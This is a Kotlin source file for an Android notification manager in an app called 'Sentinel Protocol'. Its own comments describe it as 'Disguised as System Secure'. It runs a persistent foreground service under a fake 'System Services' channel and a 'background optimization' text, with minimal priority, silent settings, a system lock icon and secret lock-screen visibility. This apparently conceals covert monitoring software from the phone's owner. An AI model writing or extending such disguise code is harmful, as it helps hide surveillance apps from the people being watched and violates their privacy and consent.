package com.husseindev.sentinelprotocol.service

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import androidx.core.app.NotificationCompat
import com.husseindev.sentinelprotocol.MainActivity
import com.husseindev.sentinelprotocol.core.constants.AppConstants
import dagger.hilt.android.qualifiers.ApplicationContext
import javax.inject.Inject
import javax.inject.Singleton

// ══════════════════════════════════════════
//  SENTINEL PROTOCOL — Notification Manager
//  Disguised as "System Secure"
//  برمجة حسين حميد
// ══════════════════════════════════════════

@Singleton
class SentinelNotificationManager @Inject constructor(
    @ApplicationContext private val context: Context
) {
    private val notificationManager =
        context.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager

    fun createNotificationChannel() {
        val channel = NotificationChannel(
            AppConstants.NOTIFICATION_CHANNEL_ID,
            "System Services",                  // Disguised name
            NotificationManager.IMPORTANCE_MIN  // No sound, no pop-up
        ).apply {
            description           = "Background system optimization"
            setShowBadge(false)
            enableLights(false)
            enableVibration(false)
            lockscreenVisibility  = Notification.VISIBILITY_SECRET  // Hidden on lock screen
        }
        notificationManager.createNotificationChannel(channel)
    }

    fun buildForegroundNotification(): Notification {
        val intent = Intent(context, MainActivity::class.java).apply {
            flags = Intent.FLAG_ACTIVITY_SINGLE_TOP
        }
        val pendingIntent = PendingIntent.getActivity(
            context, 0, intent,
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(context, AppConstants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle(AppConstants.NOTIFICATION_TITLE)       // "System Secure"
            .setContentText("Running background optimization…")
            .setSmallIcon(android.R.drawable.ic_secure)          // System lock icon
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setOngoing(true)
            .setSilent(true)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
            .setContentIntent(pendingIntent)
            .build()
    }

    fun showBatteryWarning() {
        val notification = NotificationCompat.Builder(context, AppConstants.NOTIFICATION_CHANNEL_ID)
            .setContentTitle("System Secure")
            .setContentText("Battery low — optimization paused")
            .setSmallIcon(android.R.drawable.ic_secure)
            .setPriority(NotificationCompat.PRIORITY_DEFAULT)
            .setAutoCancel(true)
            .build()

        notificationManager.notify(AppConstants.NOTIFICATION_ID_ALERT, notification)
    }
}
